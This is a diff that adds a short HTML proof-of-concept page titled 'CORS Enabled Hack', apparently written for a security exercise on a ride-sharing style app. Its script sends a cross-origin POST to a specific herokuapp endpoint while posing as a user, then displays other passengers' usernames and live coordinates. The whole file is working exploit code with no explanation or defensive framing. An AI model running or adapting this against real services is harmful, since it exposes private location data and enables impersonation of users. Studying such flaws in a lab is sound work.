@@ -1,0 +1,27 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+  <title>CORS Enabled Hack</title>
+  <meta charset="utf-8" />
+  <script>
+  	var request = new XMLHttpRequest();
+  	request.open("POST", "https://gentle-earth-43671.herokuapp.com/submit", true);
+  	request.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
+		request.onreadystatechange = function() {
+    		if(request.readyState == 4 && request.status == 200) {
+        		data=request.responseText;
+        		jsonData=JSON.parse(data);
+        		document.getElementById("text").innerHTML=jsonData.passengers[0].username+" is at "+jsonData.passengers[0].lat+", "+jsonData.passengers[0].lng+"<br>"+jsonData.passengers[1].username+" is at "+jsonData.passengers[1].lat+", "+jsonData.passengers[1].lng;
+        	}
+        }
+    request.send("username=JANET&lat=0&lng=0");
+  </script>
+</head>
+
+<body>
+  <div id="text"/>
+</body>
+
+</html>
